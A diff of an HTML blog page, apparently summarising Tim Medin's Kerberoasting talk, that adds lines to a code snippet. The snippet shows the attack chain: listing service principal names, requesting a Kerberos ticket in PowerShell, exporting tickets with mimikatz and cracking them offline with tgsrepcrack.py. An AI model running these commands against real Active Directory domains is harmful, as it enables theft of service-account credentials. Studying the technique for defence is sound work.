@@ -12,6 +12,10 @@
   <meta name="description" content="Tim Medin 의 talk. 1
 2
 3
+4
+5
+6
+7
 PS&gt; setspn -T medin.local -F -Q */*
 PS&gt; Add-Type -AssemblyName System.IdentityModel
 PS&gt; New-Object System. &hellip;">
@@ -97,9 +101,17 @@ PS&gt; New-Object System. &hellip;">
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>PS&gt; setspn -T medin.local -F -Q */*
 </span><span class='line'>PS&gt; Add-Type -AssemblyName System.IdentityModel
-</span><span class='line'>PS&gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/web01.medin.local"</span></code></pre></td></tr></table></div></figure>
+</span><span class='line'>PS&gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/web01.medin.local"
+</span><span class='line'>
+</span><span class='line'>mimikatz # kerberos::list /export
+</span><span class='line'>
+</span><span class='line'>$ tgsrepcrack.py wordlist.txt *.kirbi</span></code></pre></td></tr></table></div></figure>
 
 </div>
   
